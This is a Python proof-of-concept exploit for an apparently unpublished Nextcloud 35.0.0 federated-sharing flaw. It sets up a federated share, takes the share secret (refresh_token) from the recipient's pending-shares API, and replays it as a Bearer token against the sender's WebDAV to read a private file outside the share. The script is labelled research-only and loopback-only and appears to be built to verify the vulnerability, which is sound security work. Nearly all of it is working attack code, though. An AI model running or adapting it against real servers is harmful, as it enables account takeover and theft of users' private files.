#!/usr/bin/env python3
######################################################################################
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: nextcloud-federated-ocm-token (Critical)
#  Vendor: Nextcloud GmbH
#  Versions: Nextcloud Server 35.0.0
#  Impact: Federated recipient -> sharer app password / full Files tree
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Loopback only. Do not run against systems you do not own.
#
######################################################################################

"""Local oracle for unpublished Nextcloud federated share PERMANENT_TOKEN.

Sender alice federates one file to bob@recipient. Recipient pending API
returns the share secret as refresh_token. That secret is an unscoped
PERMANENT_TOKEN for alice. Unauth Bearer DAV on the sender reads a private
file that is not in the share.

Do not call OCM access-token (first exchange locks FS scope; TEMPORARY OCM
access tokens are rejected on /remote.php/dav). Loopback only. No shells.
"""
from __future__ import annotations

import base64
import json
import os
import urllib.error
import urllib.parse
import urllib.request

SENDER = os.environ.get("SENDER_URL", "http://127.0.0.1:18340").rstrip("/")
RECIPIENT = os.environ.get("RECIPIENT_URL", "http://127.0.0.1:18341").rstrip("/")
ALICE = os.environ.get("NC_SENDER_USER", "alice")
ALICE_PASS = os.environ.get("NC_SENDER_PASSWORD", "LabAlice35!")
BOB = os.environ.get("NC_RECIPIENT_USER", "bob")
BOB_PASS = os.environ.get("NC_RECIPIENT_PASSWORD", "LabBob35!")
SHARE_WITH = os.environ.get("NC_SHARE_WITH", "bob@http://recipient")
SHARED_NAME = "shared-with-bob.txt"
WITNESS = "NEXTCLOUD-OCM-PERMANENT-TOKEN-WITNESS"
WITNESS_FILE = WITNESS + ".txt"


def fail(msg: str) -> None:
    print(f"FAIL NEXTCLOUD-OCM-PERMANENT-TOKEN {msg}", flush=True)
    raise SystemExit(1)


def basic(user: str, password: str) -> str:
    return "Basic " + base64.b64encode(f"{user}:{password}".encode()).decode()


def http(
    method: str,
    url: str,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = 60.0,
) -> tuple[int, dict[str, str], bytes]:
    hdrs = {"User-Agent": "nextcloud-federated-ocm-token-lab"}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            return resp.status, {k.lower(): v for k, v in resp.headers.items()}, body
    except urllib.error.HTTPError as exc:
        return exc.code, {k.lower(): v for k, v in exc.headers.items()}, exc.read()
    except urllib.error.URLError as exc:
        fail(f"http {method} {url} error {exc}")


def ocs(
    method: str,
    base: str,
    path: str,
    user: str,
    password: str,
    payload: dict[str, str] | None = None,
) -> tuple[int, dict]:
    body = None
    hdrs = {
        "OCS-APIRequest": "true",
        "Accept": "application/json",
        "Authorization": basic(user, password),
    }
    if payload is not None:
        body = urllib.parse.urlencode(payload).encode()
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
    sep = "&" if "?" in path else "?"
    url = base + path + sep + "format=json"
    code, _, raw = http(method, url, data=body, headers=hdrs)
    text = raw.decode("utf-8", "replace")
    try:
        parsed = json.loads(text) if text else {}
    except json.JSONDecodeError:
        fail(f"ocs {method} {path} http={code} not json body={text[:400]!r}")
    return code, parsed


def ocs_data(parsed: dict) -> dict | list | None:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict):
        return ocs_wrap.get("data")
    return None


def ocs_meta(parsed: dict) -> dict:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict) and isinstance(ocs_wrap.get("meta"), dict):
        return ocs_wrap["meta"]
    return {}


def as_share_list(data: object) -> list[dict]:
    if data is None:
        return []
    if isinstance(data, list):
        return [x for x in data if isinstance(x, dict)]
    if isinstance(data, dict):
        if "refresh_token" in data or "token" in data:
            return [data]
        el = data.get("element")
        if isinstance(el, list):
            return [x for x in el if isinstance(x, dict)]
        if isinstance(el, dict):
            return [el]
    return []


def main() -> None:
    print(
        f"IOC sender={SENDER} recipient={RECIPIENT} sharer={ALICE} shareWith={SHARE_WITH}",
        flush=True,
    )

    code, parsed = ocs("GET", SENDER, "/ocs/v2.php/cloud/users/" + ALICE, ALICE, ALICE_PASS)
    print(f"IOC alice-login http={code} meta={ocs_meta(parsed)}", flush=True)
    if code not in (200, 201):
        fail(f"alice login http={code} meta={ocs_meta(parsed)}")

    code, parsed = ocs("GET", RECIPIENT, "/ocs/v2.php/cloud/users/" + BOB, BOB, BOB_PASS)
    print(f"IOC bob-login http={code} meta={ocs_meta(parsed)}", flush=True)
    if code not in (200, 201):
        fail(f"bob login http={code} meta={ocs_meta(parsed)}")

    code, parsed = ocs(
        "POST",
        SENDER,
        "/ocs/v2.php/apps/files_sharing/api/v1/shares",
        ALICE,
        ALICE_PASS,
        {
            "path": "/" + SHARED_NAME,
            "shareType": "6",
            "shareWith": SHARE_WITH,
            "permissions": "1",
        },
    )
    data = ocs_data(parsed)
    print(
        f"IOC create-share http={code} meta={ocs_meta(parsed)} data={json.dumps(data)[:800]}",
        flush=True,
    )
    if code not in (200, 201):
        fail(f"create share http={code} meta={ocs_meta(parsed)} data={json.dumps(data)[:400]}")

    code, parsed = ocs(
        "GET",
        RECIPIENT,
        "/ocs/v2.php/apps/files_sharing/api/v1/remote_shares/pending",
        BOB,
        BOB_PASS,
    )
    data = ocs_data(parsed)
    shares = as_share_list(data)
    print(
        f"IOC pending http={code} meta={ocs_meta(parsed)} count={len(shares)} data={json.dumps(data)[:1200]}",
        flush=True,
    )
    if code not in (200, 201) or not shares:
        fail(f"pending shares http={code} meta={ocs_meta(parsed)} data={json.dumps(data)[:400]}")

    share = shares[0]
    refresh = str(share.get("refresh_token") or share.get("token") or "")
    access = share.get("access_token") or ""
    print(
        f"IOC pending refresh_token_len={len(refresh)} access_token_len={len(str(access))} remote={share.get('remote')!r} name={share.get('name')!r}",
        flush=True,
    )
    if len(refresh) != 32:
        fail(f"refresh_token_len={len(refresh)} expected=32")
    if access:
        print("IOC pending-has-access-token (recipient may have auto-exchanged)", flush=True)

    dav_path = f"/remote.php/dav/files/{ALICE}/{WITNESS_FILE}"
    dav_code, dav_hdrs, dav_body = http(
        "GET",
        SENDER + dav_path,
        headers={"Authorization": f"Bearer {refresh}"},
    )
    text = dav_body.decode("utf-8", "replace")
    xuid = dav_hdrs.get("x-user-id", "")
    print(
        f"IOC dav-bearer http={dav_code} x-user-id={xuid!r} body={text[:200]!r}",
        flush=True,
    )
    if dav_code in (401, 403):
        fail(f"dav bearer http={dav_code} body={text[:300]!r}")
    if dav_code != 200:
        fail(f"dav bearer http={dav_code} body={text[:300]!r}")
    if WITNESS not in text:
        fail(f"dav body missing witness got={text[:200]!r}")
    if xuid and xuid != ALICE:
        fail(f"x-user-id={xuid!r} expected={ALICE!r}")

    print(
        f"SUCCESS NEXTCLOUD-OCM-PERMANENT-TOKEN who=federated-recipient uid={ALICE} {WITNESS}",
        flush=True,
    )


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:
        fail(f"unhandled {type(exc).__name__}: {exc}")
